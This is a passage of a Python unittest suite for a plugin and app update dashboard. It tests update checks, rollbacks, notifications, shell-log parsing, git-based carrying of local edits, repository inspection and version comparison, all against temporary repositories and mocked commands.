                 {'id': 'other', 'kind': 'plugin', 'name': 'O', 'updateState': 'behind'}]
        with patch.object(dash, 'discover_plugins', lambda: [{'id': 'x.plugin'}, {'id': 'other'}]), \
             patch.object(dash, 'check_plugin', lambda p: dict(next(i for i in items if i['id'] == p['id']))):
            status = dash.check_all()
        ids = {i['id']: i for i in status['items']}
        self.assertEqual(status['updatable'], 0)
        self.assertEqual(ids['other']['holdReason'], 'waiting on upstream')
        self.assertTrue(ids['other']['held'])
        self.assertEqual(ids['x.plugin']['rollback'], {'to': self.old[:7], 'toVersion': '1.0.0', 'fromVersion': '1.1.0'})
        self.assertIsNone(ids['other']['rollback'])
        self.assertNotIn('notify-send', [c[0] for c in self.calls])
        self.assertEqual(status['history'][0]['action'], 'update')
        self.assertEqual(status['history'][0]['name'], 'X', 'the display name, not the id')


class GitLogTests(RealRepoFixture):
    def test_parses_commits_newest_first(self):
        commits = dash.git_log(self.plugin, f'{self.old}..HEAD')
        self.assertEqual([c['subject'] for c in commits], ['two'])
        self.assertEqual(commits[0]['author'], 't')
        self.assertGreater(commits[0]['ts'], 0)

    def test_plugin_diff_returns_incoming_and_local(self):
        # Upstream is one commit behind us, written the way `git fetch` leaves it.
        (self.plugin / '.git' / 'FETCH_HEAD').write_text(self.old + "\t\tbranch 'main' of origin\n")
        dash.cmd_diff(type('A', (), {'id': 'x.plugin'})())
        r = self.printed[-1]
        self.assertTrue(r['ok'])
        self.assertEqual(r['incoming'], [])
        self.assertEqual([c['subject'] for c in r['local']], ['two'])


class AwaitNotificationTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        state = Path(self._tmp.name)
        for target, value in (('STATE', state), ('STATUS_PATH', state / 'status.json')):
            patcher = patch.object(dash, target, value)
            patcher.start()
            self.addCleanup(patcher.stop)
        dash.STATUS_PATH.write_text(json.dumps({'items': [
            {'id': 'a', 'name': 'A', 'updateState': 'behind'},
            {'id': 'b', 'name': 'B', 'updateState': 'behind', 'held': True},
            {'id': 'c', 'name': 'C', 'updateState': 'up-to-date'},
            {'id': 'd', 'name': 'D', 'updateState': 'not-installed'},
        ]}))
        self.subprocess_calls, self.run_calls = [], []
        self.choice = 'update'
        self.update_ok = {'a': True, 'd': False}

        def fake_subprocess_run(args, **kw):
            self.subprocess_calls.append(args)
            return type('P', (), {'stdout': self.choice + '\n', 'returncode': 0})()

        def fake_update(args):
            self.updated.append(args.id)
            print('progress...')
            print(json.dumps({'ok': self.update_ok[args.id], 'message': ''}))
        self.updated = []
        p1 = patch.object(dash.subprocess, 'run', fake_subprocess_run)
        p2 = patch.object(dash, 'run', lambda args, **kw: self.run_calls.append(args) or (0, '', ''))
        p3 = patch.object(dash, 'cmd_update', fake_update)
        for pt in (p1, p2, p3):
            pt.start()
            self.addCleanup(pt.stop)

    def wait(self, ids=('a', 'b', 'c', 'd')):
        dash.cmd_await_notification(type('A', (), {'title': 'T', 'body': 'B', 'ids': list(ids)})())

    def test_update_runs_only_what_is_still_updatable_and_unheld_and_reports(self):
        self.wait()
        self.assertEqual(self.updated, ['a', 'd'])
        self.assertIn('--action=update=Update', self.subprocess_calls[0])
        last = self.run_calls[-1]
        self.assertEqual(last[0], 'notify-send')
        self.assertIn('Update failed', last)
        self.assertIn('Updated A, failed: D — open the Dashboard for details.', last)

    def _verified_only(self):
        dash.STATUS_PATH.write_text(json.dumps({'items': [
            {'id': 'a', 'name': 'A', 'kind': 'plugin', 'updateState': 'behind', 'market': {'incoming': 'verified'}},
            {'id': 'd', 'name': 'D', 'kind': 'plugin', 'updateState': 'behind', 'market': {'incoming': 'unverified'}},
            {'id': 'u', 'name': 'U', 'kind': 'plugin', 'updateState': 'behind', 'market': None},
            {'id': 'e', 'name': 'E', 'kind': 'app', 'updateState': 'behind'},
        ]}))
        dash._write_json(dash.settings_path(), {'updateAllScope': 'verified'})
        self.update_ok.update(a=True, e=True)

    def test_verified_only_skips_unverified_plugin_updates_and_says_so(self):
        self._verified_only()
        self.wait(ids=('a', 'd', 'u', 'e'))
        self.assertEqual(self.updated, ['a', 'e'], 'apps are not in the marketplace and always go')
        self.assertIn('Updated A, E. Skipped, update not verified: D, U', self.run_calls[-1])

    def test_verified_only_with_nothing_verified_says_not_updated(self):
        self._verified_only()
        self.wait(ids=('d', 'u'))
        self.assertEqual(self.updated, [])
        self.assertIn('Not updated', self.run_calls[-1])
        self.assertIn('Skipped, update not verified: D, U', self.run_calls[-1])

    def test_scope_defaults_to_all(self):
        self.assertEqual(dash.update_all_scope(), 'all')
        dash._write_json(dash.settings_path(), {'updateAllScope': 'bogus'})
        self.assertEqual(dash.update_all_scope(), 'all')
        dash._write_json(dash.settings_path(), ['not', 'a', 'dict'])
        self.assertEqual(dash.update_all_scope(), 'all')
        self.assertTrue(dash.in_update_all({'kind': 'plugin', 'market': None}, 'all'))

    def test_nothing_left(self):
        self.wait(ids=('c',))
        self.assertIn('Nothing left to update.', self.run_calls[-1])

    def test_open_opens_the_panel(self):
        self.choice = 'open'
        self.wait()
        self.assertEqual(self.run_calls, [['omarchy-shell', dash.SELF_ID, 'open']])
        self.assertEqual(len(self.subprocess_calls), 1)

    def test_dismissed_does_nothing(self):
        self.choice = ''
        self.wait()
        self.assertEqual(self.run_calls, [])
        self.assertEqual(len(self.subprocess_calls), 1)


LOG_LINE = '2026-10-01 13:24:52.349  {level} {text}'


class ShellLogFixture(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name) / 'by-id'
        self.instance = self.root / 'aaa'
        self.instance.mkdir(parents=True)
        self.log = self.instance / 'log.log'
        self.log.write_text('')
        self.plugin_dir = Path(self._tmp.name) / 'plugins' / 'x.plugin'
        self.plugin_dir.mkdir(parents=True)
        patcher = patch.object(dash, 'SHELL_LOG_ROOT', self.root)
        patcher.start()
        self.addCleanup(patcher.stop)

    def say(self, level, text, log=None):
        with (log or self.log).open('a') as f:
            f.write(LOG_LINE.format(level=level, text=text) + '\n')

    def problems(self, mark):
        return dash.new_plugin_problems('x.plugin', self.plugin_dir, mark)


class ShellLogTests(ShellLogFixture):
    def test_only_new_warnings_about_this_plugin_count(self):
        self.say('WARN', 'scene: QML IpcHandler at file:///h/.config/omarchy/plugins/x.plugin/Theme.qml[84:30]: no target')
        mark = dash.shell_log_mark()
        self.say('WARN', 'scene: QML IpcHandler at file:///h/.config/omarchy/plugins/x.plugin/Theme.qml[84:30]: no target')
        self.say('WARN', 'scene: file:///h/.config/omarchy/plugins/other/Panel.qml:3: TypeError')
        self.say('DEBUG', 'qml: file:///h/.config/omarchy/plugins/x.plugin/Panel.qml loaded')
        self.say('INFO', 'qml: Local plugin changed, reloading: x.plugin')
        self.assertEqual(self.problems(mark), ([], False))

    def test_a_load_failure_is_a_failure(self):
        mark = dash.shell_log_mark()
        self.say('WARN', 'qml: Plugin widget x.plugin failed: Panel.qml:12 Type Foo unavailable')
        lines, failed = self.problems(mark)
        self.assertEqual(lines, ['WARN qml: Plugin widget x.plugin failed: Panel.qml:12 Type Foo unavailable'])
        self.assertTrue(failed)

    def test_a_runtime_type_error_in_its_files_is_a_failure(self):
        mark = dash.shell_log_mark()
        self.say('WARN', 'scene: file:///h/.config/omarchy/plugins/x.plugin/Panel.qml:40: TypeError: Cannot read property')
        self.assertTrue(self.problems(mark)[1])

    def test_a_new_plain_warning_is_reported_but_not_a_failure(self):
        mark = dash.shell_log_mark()
        self.say('WARN', 'scene: file:///h/.config/omarchy/plugins/x.plugin/Panel.qml:7: Binding loop detected')
        lines, failed = self.problems(mark)
        self.assertEqual(len(lines), 1)
        self.assertFalse(failed)
        ok, text = dash.check_plugin_loaded('x.plugin', self.plugin_dir, mark)
        self.assertTrue(ok)
        self.assertIn('new warnings', text)

    def test_a_similarly_named_plugin_is_not_this_one(self):
        mark = dash.shell_log_mark()
        self.say('WARN', 'qml: Plugin widget x.plugin-two failed: nope')
        self.say('WARN', 'scene: file:///h/.config/omarchy/plugins/x.plugin-two/Panel.qml:1: TypeError')
        self.assertEqual(self.problems(mark), ([], False))

    def test_the_resolved_path_of_a_symlinked_plugin_counts(self):
        # The Dashboard's own plugin dir is a symlink to ~/Projects/dashboard, and the shell
        # can log the resolved path, which has neither /plugins/ nor the id in it.
        source = Path(self._tmp.name) / 'Projects' / 'dashboard'
        source.mkdir(parents=True)
        link = Path(self._tmp.name) / 'plugins' / 'linked.plugin'
        link.symlink_to(source)
        mark = dash.shell_log_mark()
        self.say('WARN', f'scene: file://{source}/Panel.qml:1: ReferenceError: x is not defined')
        lines, failed = dash.new_plugin_problems('linked.plugin', link, mark)
        self.assertEqual(len(lines), 1)
        self.assertTrue(failed)

    def test_a_shell_restart_reads_the_whole_new_log_against_the_old_one(self):
        self.say('WARN', 'scene: file:///h/.config/omarchy/plugins/x.plugin/Theme.qml: no target')
        mark = dash.shell_log_mark()
        newer = self.root / 'bbb'
        newer.mkdir()
        new_log = newer / 'log.log'
        self.say('WARN', 'scene: file:///h/.config/omarchy/plugins/x.plugin/Theme.qml: no target', log=new_log)
        self.say('WARN', 'qml: Plugin widget x.plugin failed: boom', log=new_log)
        import os
        os.utime(new_log, (time.time() + 5, time.time() + 5))
        lines, failed = self.problems(mark)
        self.assertEqual(lines, ['WARN qml: Plugin widget x.plugin failed: boom'])
        self.assertTrue(failed)

    def test_no_shell_log_at_all_is_quiet(self):
        with patch.object(dash, 'SHELL_LOG_ROOT', Path(self._tmp.name) / 'missing'):
            self.assertEqual(dash.shell_log_mark(), (None, 0))
            self.assertEqual(dash.new_plugin_problems('x.plugin', self.plugin_dir, (None, 0)), ([], False))


class UpdateLoadCheckTests(RealRepoFixture):
    def setUp(self):
        super().setUp()
        self.instance = Path(self._tmp.name) / 'by-id' / 'aaa'
        self.instance.mkdir(parents=True)
        self.log = self.instance / 'log.log'
        self.log.write_text('')
        patcher = patch.object(dash, 'SHELL_LOG_ROOT', self.instance.parent)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.broken = False
        real = dash.run
        plugin, log, new = self.plugin, self.log, self.new

        def updating(args, **kw):
            if args[:3] == ['omarchy', 'plugin', 'update']:
                git(plugin, 'reset', '-q', '--hard', new)
                if self.broken:
                    with log.open('a') as f:
                        f.write(LOG_LINE.format(level='WARN', text='qml: Plugin widget x.plugin failed: Panel.qml:1 bad') + '\n')
                return (0, 'Updated.', '')
            return real(args, **kw)
        git(self.plugin, 'reset', '-q', '--hard', self.old)
        patcher = patch.object(dash, 'run', updating)
        patcher.start()
        self.addCleanup(patcher.stop)

    def update(self):
        with patch.object(dash, 'install_new_units', return_value=([], True)):
            dash.cmd_update(type('A', (), {'id': 'x.plugin'})())
        return self.printed[-1]

    def test_a_widget_the_shell_cannot_load_fails_the_update_and_can_be_rolled_back(self):
        self.broken = True
        result = self.update()
        self.assertFalse(result['ok'])
        self.assertIn('Update landed, but the shell could not load it', result['message'])
        self.assertIn('Plugin widget x.plugin failed', result['message'])
        self.assertFalse(dash.load_history()[-1]['ok'])
        self.assertIsNotNone(dash.rollback_candidate('x.plugin', dash.load_history()))

    def test_a_clean_load_is_a_plain_success(self):
        result = self.update()
        self.assertTrue(result['ok'], result)
        self.assertNotIn('shell', result['message'])

    def test_an_update_that_moved_nothing_does_not_wait_for_a_reload(self):
        git(self.plugin, 'reset', '-q', '--hard', self.new)
        with patch.object(dash, 'check_plugin_loaded') as check:
            self.update()
        check.assert_not_called()

    def test_a_rollback_whose_old_version_will_not_load_reports_failure(self):
        git(self.plugin, 'reset', '-q', '--hard', self.new)
        self.record_update()
        real = dash.run
        log = self.log

        def rescan_breaks(args, **kw):
            if args[:3] == ['omarchy-shell', 'shell', 'rescanPlugins']:
                with log.open('a') as f:
                    f.write(LOG_LINE.format(level='WARN', text='qml: Plugin widget x.plugin failed: old') + '\n')
            return real(args, **kw)
        with patch.object(dash, 'run', rescan_breaks):
            result = self.rollback()
        self.assertFalse(result['ok'])
        self.assertIn('could not load it', result['message'])
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), self.old)


class WebUrlTests(unittest.TestCase):
    def test_forms(self):
        cases = {
            'git@github.com:nixfred/pulse.git': 'https://github.com/nixfred/pulse',
            'https://github.com/martythedev-tech/omamail.git': 'https://github.com/martythedev-tech/omamail',
            'https://github.com/martythedev-tech/omamail': 'https://github.com/martythedev-tech/omamail',
            'ssh://git@gitlab.com:2222/group/sub/repo.git': 'https://gitlab.com/group/sub/repo',
            'https://aur.archlinux.org/flea.git': 'https://aur.archlinux.org/packages/flea',
            'ssh://aur@aur.archlinux.org/howdy.git': 'https://aur.archlinux.org/packages/howdy',
            '/home/x/mirror.git': '',
            '': '',
        }
        for remote, expected in cases.items():
            self.assertEqual(dash.web_url(remote), expected, remote)

    def test_credentials_never_survive(self):
        url = dash.web_url('https://martythedev-tech:ghp_SECRETTOKEN@github.com/martythedev-tech/omamail.git')
        self.assertEqual(url, 'https://github.com/martythedev-tech/omamail')
        self.assertNotIn('SECRET', url)


class CarryUpdateTests(unittest.TestCase):
    """A real upstream and a real plugin clone of it, so stash/rebase/merge-tree run for
    real; only omarchy and the shell rescan are faked."""

    def setUp(self):
        import subprocess
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = Path(self._tmp.name)
        self.upstream = root / 'upstream'
        self.upstream.mkdir()
        git(self.upstream, 'init', '-q', '-b', 'main')
        git(self.upstream, 'config', 'user.email', 't@t'); git(self.upstream, 'config', 'user.name', 't')
        (self.upstream / 'Bar.qml').write_text('color: Color.accent\nwidth: 10\n')
        (self.upstream / 'Panel.qml').write_text('a\nb\nc\n')
        git(self.upstream, 'add', '.'); git(self.upstream, 'commit', '-qm', 'one')
        self.plugin = root / 'plugins' / 'x.plugin'
        subprocess.run(['git', 'clone', '-q', str(self.upstream), str(self.plugin)], check=True)
        git(self.plugin, 'config', 'user.email', 't@t'); git(self.plugin, 'config', 'user.name', 't')
        self.old = git(self.plugin, 'rev-parse', 'HEAD')
        self.validate_rc = 0
        real_run = dash.run

        def fake(args, cwd=None, timeout=20, **kw):
            if args[0] == 'git':
                return real_run(args, cwd=cwd, timeout=timeout)
            if args[:3] == ['omarchy', 'plugin', 'validate']:
                return (self.validate_rc, '', 'invalid manifest' if self.validate_rc else '')
            return (0, '', '')
        patcher = patch.object(dash, 'run', fake)
        patcher.start()
        self.addCleanup(patcher.stop)

    def upstream_commit(self, name, text):
        (self.upstream / name).write_text(text)
        git(self.upstream, 'commit', '-qam', 'upstream change')

    def fetch(self):
        git(self.plugin, 'fetch', '-q', 'origin', 'HEAD')

    def test_an_edit_away_from_the_update_is_kept_on_top(self):
        self.upstream_commit('Panel.qml', 'A\nb\nc\n')
        (self.plugin / 'Bar.qml').write_text('color: Commons.Color.accent\nwidth: 10\n')
        self.fetch()
        self.assertEqual(dash.plugin_update_state(self.plugin), ('behind', 1, ''))
        rc, out, err = dash.carry_update(self.plugin)
        self.assertEqual(rc, 0, err)
        self.assertIn('Kept 1 locally edited file(s)', out)
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), git(self.upstream, 'rev-parse', 'HEAD'))
        self.assertEqual((self.plugin / 'Panel.qml').read_text(), 'A\nb\nc\n')
        self.assertIn('Commons.Color', (self.plugin / 'Bar.qml').read_text())
        self.assertEqual(git(self.plugin, 'stash', 'list'), '')

    def test_an_edit_upstream_also_made_leaves_a_clean_checkout(self):
        self.upstream_commit('Bar.qml', 'color: Commons.Color.accent\nwidth: 10\n')
        (self.plugin / 'Bar.qml').write_text('color: Commons.Color.accent\nwidth: 10\n')
        self.fetch()
        self.assertEqual(dash.plugin_update_state(self.plugin)[0], 'behind')
        rc, out, err = dash.carry_update(self.plugin)
        self.assertEqual(rc, 0, err)
        self.assertIn('none are left over', out)
        self.assertEqual(git(self.plugin, 'status', '--porcelain'), '')

    def test_a_local_commit_is_rebased_onto_the_update(self):
        (self.plugin / 'Bar.qml').write_text('color: Color.accent\nwidth: 12\n')
        git(self.plugin, 'commit', '-qam', 'local fix')
        self.upstream_commit('Panel.qml', 'A\nb\nc\n')
        self.fetch()
        self.assertEqual(dash.plugin_update_state(self.plugin), ('behind', 1, ''))
        rc, out, err = dash.carry_update(self.plugin)
        self.assertEqual(rc, 0, err)
        self.assertIn('Kept 1 local commit(s)', out)
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD~1'), git(self.upstream, 'rev-parse', 'HEAD'))
        self.assertIn('width: 12', (self.plugin / 'Bar.qml').read_text())

    def test_a_clashing_edit_is_dirty_and_an_update_anyway_changes_nothing(self):
        self.upstream_commit('Bar.qml', 'color: Color.urgent\nwidth: 10\n')
        (self.plugin / 'Bar.qml').write_text('color: Commons.Color.accent\nwidth: 10\n')
        self.fetch()
        self.assertEqual(dash.plugin_update_state(self.plugin),
                         ('dirty', 1, '1 file(s) changed locally -- clashes with the update in Bar.qml'))
        rc, out, err = dash.carry_update(self.plugin)
        self.assertEqual(rc, 1)
        self.assertIn('Nothing changed', err)
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), self.old)
        self.assertEqual((self.plugin / 'Bar.qml').read_text(), 'color: Commons.Color.accent\nwidth: 10\n')
        self.assertEqual(git(self.plugin, 'stash', 'list'), '')

    def test_a_clashing_local_commit_is_diverged_and_restored(self):
        (self.plugin / 'Bar.qml').write_text('color: Color.accent\nwidth: 12\n')
        git(self.plugin, 'commit', '-qam', 'local fix')
        local = git(self.plugin, 'rev-parse', 'HEAD')
        self.upstream_commit('Bar.qml', 'color: Color.accent\nwidth: 14\n')
        self.fetch()
        self.assertEqual(dash.plugin_update_state(self.plugin)[0], 'diverged')
        rc, _, err = dash.carry_update(self.plugin)
        self.assertEqual(rc, 1)
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), local)
        self.assertFalse(dash.repo_operation_in_progress(self.plugin))

    def test_failed_validation_puts_back_the_old_version_and_the_edit(self):
        self.upstream_commit('Panel.qml', 'A\nb\nc\n')
        (self.plugin / 'Bar.qml').write_text('color: Commons.Color.accent\nwidth: 10\n')
        self.validate_rc = 1
        rc, _, err = dash.carry_update(self.plugin)
        self.assertEqual(rc, 1)
        self.assertIn('invalid manifest', err)
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), self.old)
        self.assertIn('Commons.Color', (self.plugin / 'Bar.qml').read_text())
        self.assertEqual(git(self.plugin, 'stash', 'list'), '')

    def upstream_add(self, name, text):
        (self.upstream / name).write_text(text)
        git(self.upstream, 'add', name)
        git(self.upstream, 'commit', '-qm', 'upstream adds ' + name)

    def test_a_new_file_the_update_also_adds_identically_no_longer_blocks_it(self):
        # 2026-10-22: an edit plus a new file, both pushed from the installed copy, came
        # back as the update and the merge refused to overwrite the untracked file.
        (self.plugin / 'Panel.qml').write_text('A\nb\nc\n')
        (self.plugin / 'guard').write_text('#!/bin/sh\n')
        self.upstream_commit('Panel.qml', 'A\nb\nc\n')
        self.upstream_add('guard', '#!/bin/sh\n')
        self.fetch()
        self.assertEqual(dash.plugin_update_state(self.plugin)[0], 'behind')
        rc, out, err = dash.carry_update(self.plugin)
        self.assertEqual(rc, 0, err)
        self.assertIn('none are left over', out)
        self.assertEqual(git(self.plugin, 'status', '--porcelain'), '')
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), git(self.upstream, 'rev-parse', 'HEAD'))
        self.assertFalse((self.plugin / '.git' / 'dashboard-parked').exists())

    def test_a_new_file_alone_routes_the_update_through_the_carry(self):
        (self.plugin / 'guard').write_text('#!/bin/sh\n')
        self.upstream_add('guard', '#!/bin/sh\n')
        self.fetch()
        self.assertTrue(dash.has_local_work(self.plugin))
        rc, _, err = dash.carry_update(self.plugin)
        self.assertEqual(rc, 0, err)
        self.assertEqual(git(self.plugin, 'status', '--porcelain'), '')

    def test_a_different_new_file_at_the_same_path_is_dirty_and_kept(self):
        (self.plugin / 'guard').write_text('mine\n')
        self.upstream_add('guard', 'theirs\n')
        self.fetch()
        state, _, why = dash.plugin_update_state(self.plugin)
        self.assertEqual(state, 'dirty')
        self.assertIn('guard', why)
        rc, _, err = dash.carry_update(self.plugin)
        self.assertEqual(rc, 1)
        self.assertIn('Nothing changed', err)
        self.assertEqual((self.plugin / 'guard').read_text(), 'mine\n')
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), self.old)

    def test_a_parked_file_is_put_back_when_validation_fails(self):
        (self.plugin / 'Bar.qml').write_text('color: Commons.Color.accent\nwidth: 10\n')
        (self.plugin / 'guard').write_text('#!/bin/sh\n')
        self.upstream_add('guard', '#!/bin/sh\n')
        self.validate_rc = 1
        rc, _, err = dash.carry_update(self.plugin)
        self.assertEqual(rc, 1)
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), self.old)
        self.assertEqual((self.plugin / 'guard').read_text(), '#!/bin/sh\n')
        self.assertIn('Commons.Color', (self.plugin / 'Bar.qml').read_text())
        self.assertFalse((self.plugin / '.git' / 'dashboard-parked').exists())

    def test_an_unrelated_untracked_file_is_left_alone(self):
        (self.plugin / 'notes.md').write_text('mine\n')
        self.upstream_commit('Panel.qml', 'A\nb\nc\n')
        self.fetch()
        self.assertFalse(dash.has_local_work(self.plugin))
        self.assertEqual(dash.plugin_update_state(self.plugin)[0], 'behind')


class RepoGuessFixture(unittest.TestCase):
    """A real repo with a real remote, so remote/branch guessing runs actual git."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = Path(self._tmp.name)
        self.upstream = root / 'upstream'
        self.upstream.mkdir()
        git(self.upstream, 'init', '-q', '-b', 'master')
        git(self.upstream, 'config', 'user.email', 't@t'); git(self.upstream, 'config', 'user.name', 't')
        (self.upstream / '.SRCINFO').write_text('pkgbase = flea-bin\n\tpkgver = 1\n\tpkgrel = 1\n\npkgname = flea\n')
        git(self.upstream, 'add', '.'); git(self.upstream, 'commit', '-qm', 'one')
        self.repo = root / 'Flea'
        import subprocess
        subprocess.run(['git', 'clone', '-q', str(self.upstream), str(self.repo)], check=True)
        git(self.repo, 'checkout', '-qb', 'aarch64-local')
        for target, value in (('load_apps', lambda: []), ('ensure_apps_file', lambda: None)):
            patcher = patch.object(dash, target, value)
            patcher.start()
            self.addCleanup(patcher.stop)


class InspectRepoTests(RepoGuessFixture):
    def test_guesses_from_srcinfo_remote_and_upstream_branch(self):
        rebuild = self.repo / 'rebuild.sh'
        rebuild.write_text('#!/bin/sh\n'); rebuild.chmod(0o755)
        fields, notes = dash.inspect_repo(str(self.repo))
        self.assertEqual(fields, {'name': 'Flea', 'id': 'flea', 'repoDir': str(self.repo), 'pkgName': 'flea',
                                  'branch': 'master', 'remote': 'origin', 'updateCmd': './rebuild.sh --install', 'pullFirst': False})
        self.assertEqual(notes, [])

    def test_upstream_branch_without_origin_head_falls_back_to_an_existing_master_or_main(self):
        git(self.repo, 'remote', 'set-head', 'origin', '--delete')
        self.assertEqual(dash.inspect_repo(str(self.repo))[0]['branch'], 'master')

    def test_what_cannot_be_guessed_is_said(self):
        (self.repo / '.SRCINFO').unlink()
        fields, notes = dash.inspect_repo(str(self.repo))
        self.assertEqual(fields['updateCmd'], '')
        self.assertEqual(fields['pkgName'], 'flea')
        self.assertTrue(any('.SRCINFO' in n for n in notes))
        self.assertTrue(any('rebuild.sh' in n for n in notes))

    def test_a_non_executable_rebuild_sh_is_not_offered(self):
        (self.repo / 'rebuild.sh').write_text('#!/bin/sh\n')
        self.assertEqual(dash.inspect_repo(str(self.repo))[0]['updateCmd'], '')

    def test_already_tracked_is_said(self):
        with patch.object(dash, 'load_apps', lambda: [{'id': 'flea'}]):
            self.assertTrue(any('already tracked' in n for n in dash.inspect_repo(str(self.repo))[1]))

    def test_not_a_repo(self):
        fields, notes = dash.inspect_repo(self._tmp.name)
        self.assertIsNone(fields)
        self.assertIn('not a git repository', notes[0])

    def test_no_remote_is_said(self):
        git(self.repo, 'remote', 'remove', 'origin')
        fields, notes = dash.inspect_repo(str(self.repo))
        self.assertEqual((fields['remote'], fields['branch']), ('', ''))
        self.assertTrue(any('No git remote' in n for n in notes))


class RepoInfoTests(RepoGuessFixture):
    def test_branch_link_and_upstream_date(self):
        git(self.repo, 'remote', 'set-url', 'origin', 'https://user:tok@aur.archlinux.org/flea.git')
        info = dash.repo_info(self.repo, 'origin', 'origin/master')
        self.assertEqual(info['branch'], 'aarch64-local')
        self.assertEqual(info['webUrl'], 'https://aur.archlinux.org/packages/flea')
        self.assertEqual(info['path'], str(self.repo))
        self.assertGreater(info['upstreamTs'], 0)

    def test_no_upstream_date_when_upstream_was_not_compared(self):
        self.assertEqual(dash.repo_info(self.repo, 'origin', None)['upstreamTs'], 0)

    def test_not_a_repo_is_just_the_path(self):
        self.assertEqual(dash.repo_info(self._tmp.name, 'origin', 'origin/master'),
                         {'path': self._tmp.name, 'branch': '', 'webUrl': '', 'upstreamTs': 0})


class PickFolderTests(RepoGuessFixture):
    def pick(self, rc, out, err=''):
        printed = []
        real = dash.run
        def fake(args, **kw):
            if args[0] == 'omarchy-file-select':
                self.assertIn('--directory', args)
                return (rc, out, err)
            return real(args, **kw)
        with patch.object(dash, 'run', fake), patch('builtins.print', lambda *a, **k: printed.append(json.loads(a[0]))):
            dash.cmd_pick_folder(None)
        return printed[-1]

    def test_a_chosen_repo_is_inspected(self):
        r = self.pick(0, str(self.repo) + '\n')
        self.assertTrue(r['ok'])
        self.assertEqual(r['fields']['pkgName'], 'flea')

    def test_cancel_is_quiet(self):
        r = self.pick(0, '')
        self.assertEqual((r['ok'], r['cancelled']), (False, True))

    def test_a_portal_error_is_reported_not_treated_as_cancel(self):
        r = self.pick(1, '', 'No FileChooser portal')
        self.assertFalse(r['cancelled'])
        self.assertIn('No FileChooser portal', r['notes'][0])

    def test_a_chosen_folder_that_is_not_a_repo_keeps_the_path(self):
        r = self.pick(0, self._tmp.name + '\n')
        self.assertFalse(r['ok'])
        self.assertEqual(r['fields'], {'repoDir': self._tmp.name})


class AddAppUpdateCommandTests(RepoGuessFixture):
    def add(self, **fields):
        printed = []
        saved = []
        base = {'name': 'Flea', 'id': 'flea', 'repoDir': str(self.repo)}
        base.update(fields)
        with patch.object(dash, 'save_apps', saved.append), patch.object(dash, 'check_all'), \
             patch('builtins.print', lambda *a, **k: printed.append(json.loads(a[0]))):
            dash.cmd_add_app(type('A', (), {'json': json.dumps(base)})())
        return printed[-1], saved

    def test_an_empty_update_command_is_refused(self):
        r, saved = self.add(updateCmd='')
        self.assertFalse(r['ok'])
        self.assertIn('update command is required', r['message'])
        self.assertEqual(saved, [])

    def test_a_missing_one_still_defaults_to_rebuild_sh(self):
        r, saved = self.add()
        self.assertTrue(r['ok'])
        self.assertEqual(saved[0][-1]['updateCmd'], ['./rebuild.sh', '--install'])


class NoOpUpdateHistoryTests(RealRepoFixture):
    def test_a_plugin_update_that_pulled_nothing_is_not_recorded(self):
        real = dash.run
        def nothing_to_pull(args, **kw):
            if args[:3] == ['omarchy', 'plugin', 'update']:
                return (0, 'x.plugin is up to date.', '')
            return real(args, **kw)
        with patch.object(dash, 'run', nothing_to_pull):
            dash.cmd_update(type('A', (), {'id': 'x.plugin'})())
        self.assertTrue(self.printed[-1]['ok'])
        self.assertEqual(dash.load_history(), [])

    def test_a_failed_plugin_update_that_moved_nothing_is_still_recorded(self):
        real = dash.run
        def failing(args, **kw):
            if args[:3] == ['omarchy', 'plugin', 'update']:
                return (1, '', 'fetch failed')
            return real(args, **kw)
        with patch.object(dash, 'run', failing):
            dash.cmd_update(type('A', (), {'id': 'x.plugin'})())
        self.assertEqual(len(dash.load_history()), 1)
        self.assertFalse(dash.load_history()[0]['ok'])


class VersionChangeTests(RealRepoFixture):
    """RealRepoFixture's two commits move manifest.json 1.0.0 -> 1.1.0."""

    def test_upstream_plugin_version_is_read_from_the_ref_without_touching_the_checkout(self):
        git(self.plugin, 'reset', '-q', '--hard', self.old)
        self.assertEqual(dash.upstream_version(self.plugin, self.new, 'plugin'), '1.1.0')
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), self.old)
        self.assertEqual(dash.upstream_version(self.plugin, 'no-such-ref', 'plugin'), '')

    def test_upstream_app_version_comes_from_srcinfo(self):
        (self.plugin / '.SRCINFO').write_text('pkgbase = x\n\tpkgver = 2.0\n\tpkgrel = 3\n')
        git(self.plugin, 'add', '.'); git(self.plugin, 'commit', '-qm', 'srcinfo')
        self.assertEqual(dash.upstream_version(self.plugin, 'HEAD', 'app'), '2.0-3')

    def test_version_change(self):
        self.assertIs(dash.version_change('1.0.0', '1.1.0'), True)
        self.assertIs(dash.version_change('1.1.0', '1.1.0'), False)
        self.assertIsNone(dash.version_change('1.1.0', ''))
        self.assertIsNone(dash.version_change('', '1.1.0'))

    def behind_item(self, upstream_manifest):
        # A third commit upstream that may or may not move the version.
        git(self.plugin, 'reset', '-q', '--hard', self.new)
        (self.plugin / 'README.md').write_text('docs\n')
        if upstream_manifest:
            (self.plugin / 'manifest.json').write_text(upstream_manifest)
        git(self.plugin, 'add', '.'); git(self.plugin, 'commit', '-qm', 'three')
        third = git(self.plugin, 'rev-parse', 'HEAD')
        git(self.plugin, 'reset', '-q', '--hard', self.new)
        (self.plugin / '.git' / 'FETCH_HEAD').write_text(third + "\t\tbranch 'master' of origin\n")
        with patch.object(dash, 'plugin_update_state', return_value=('behind', 1, '')):
            return dash.check_plugin({'id': 'x.plugin', 'enabled': True})

    def test_a_docs_only_commit_is_behind_with_no_version_change(self):
        item = self.behind_item(None)
        self.assertEqual((item['version'], item['upstreamVersion'], item['versionChange']), ('1.1.0', '1.1.0', False))
